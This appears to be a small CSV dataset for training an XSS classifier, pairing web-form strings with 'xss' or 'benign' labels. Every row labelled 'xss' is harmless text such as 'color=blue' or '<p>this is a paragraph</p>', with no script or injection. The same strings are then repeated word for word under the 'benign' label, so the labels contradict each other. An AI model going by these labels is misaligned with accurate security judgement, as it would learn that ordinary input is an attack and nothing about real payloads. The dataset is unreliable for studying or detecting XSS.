payload,label
feedback=this website is helpful,xss
color=blue,xss
size=medium,xss
address=bengaluru india,xss
country=india,xss
rating=4,xss
quantity=3,xss
order=processed,xss
booking=confirmed,xss
search=top colleges in bangalore,xss
user=john_doe,xss
fullname=navya shree,xss
status=active,xss
cart=empty,xss
"json={""name"":""navya"",""age"":19}",xss
html=<p>this is a paragraph</p>,xss
url=https://www.example.com,xss
home page content,xss
i love programming,xss
this is a test message,xss
temperature=27,xss
weather=today is sunny,xss
search=best coding bootcamps,xss
about us page,xss
contact=0801234567,xss
email=info@mysite.com,xss
subject=application update,xss
date=2025-01-02,xss
price=1500,xss
mobile=9876543210,xss
location=bmsit yelahanka,xss
dept=information science,xss
year=2025,xss
category=clothing,xss
username=student_01,xss
form submitted successfully,xss
hello my name is navya,xss
i am learning mern stack,xss
download file,xss
upload your resume,xss
blog post about ai,xss
article on cybersecurity,xss
menu=veg biryani,xss
hotel booking request,xss
train ticket enquiry,xss
songs list,xss
movies list,xss
search=python vs java,xss
feedback=overall great service,xss
task completed,xss
invoice id 23452,xss
order id 55321,xss
view profile,xss
contact support,xss
random text example,xss
no issues found,xss
click the button to continue,xss
session expired please login again,xss
api request received,xss
"json={""status"":""ok""}",xss
html=<div>sample content</div>,xss
preferences updated,xss
settings saved,xss
otp=452913,xss
password changed,xss
notes=project submission due next week,xss
event=tech fest 2025,xss
club=epoch society,xss
college=engineering,xss
workshop registration,xss
form validation success,xss
search=healthy recipes,xss
food=paneer tikka,xss
drink=coffee,xss
street address mg road,xss
building no 24,xss
door no 6,xss
zipcode=560064,xss
this product is worth buying,xss
the delivery was fast,xss
payment successful,xss
logout successful,xss
hello world,benign
username=navya,benign
product=shoes,benign
category=electronics,benign
search=mobile phones,benign
email=testuser@example.com,benign
name=rahul,benign
message=how are you today,benign
id=12345,benign
profile=navya123,benign
login=guest,benign
comment=nice product,benign
query=python tutorial,benign
search=best laptops 2025,benign
filter=price_low_to_high,benign
page=2,benign
sort=latest,benign
welcome to my website,benign
submit form,benign
feedback=this website is helpful,benign
color=blue,benign
size=medium,benign
address=bengaluru india,benign
country=india,benign
rating=4,benign
quantity=3,benign
order=processed,benign
booking=confirmed,benign
search=top colleges in bangalore,benign
user=john_doe,benign
fullname=navya shree,benign
status=active,benign
cart=empty,benign
"json={""name"":""navya"",""age"":19}",benign
html=<p>this is a paragraph</p>,benign
url=https://www.example.com,benign
home page content,benign
i love programming,benign
this is a test message,benign
temperature=27,benign
weather=today is sunny,benign
search=best coding bootcamps,benign
about us page,benign
contact=0801234567,benign
email=info@mysite.com,benign
subject=application update,benign
date=2025-01-02,benign
price=1500,benign
mobile=9876543210,benign
location=bmsit yelahanka,benign
dept=information science,benign
year=2025,benign
category=clothing,benign
username=student_01,benign
form submitted successfully,benign
hello my name is navya,benign
i am learning mern stack,benign
download file,benign
upload your resume,benign
blog post about ai,benign
article on cybersecurity,benign
menu=veg biryani,benign
hotel booking request,benign
train ticket enquiry,benign
songs list,benign
movies list,benign
search=python vs java,benign
feedback=overall great service,benign
task completed,benign
invoice id 23452,benign
order id 55321,benign
view profile,benign
contact support,benign
random text example,benign
no issues found,benign
click the button to continue,benign
session expired please login again,benign
api request received,benign
"json={""status"":""ok""}",benign
html=<div>sample content</div>,benign
preferences updated,benign
settings saved,benign
otp=452913,benign
password changed,benign
notes=project submission due next week,benign
event=tech fest 2025,benign
club=epoch society,benign
college=engineering,benign
workshop registration,benign
form validation success,benign
search=healthy recipes,benign
food=paneer tikka,benign
drink=coffee,benign
street address mg road,benign
building no 24,benign
door no 6,benign
zipcode=560064,benign
this product is worth buying,benign
the delivery was fast,benign
payment successful,benign
logout successful,benign
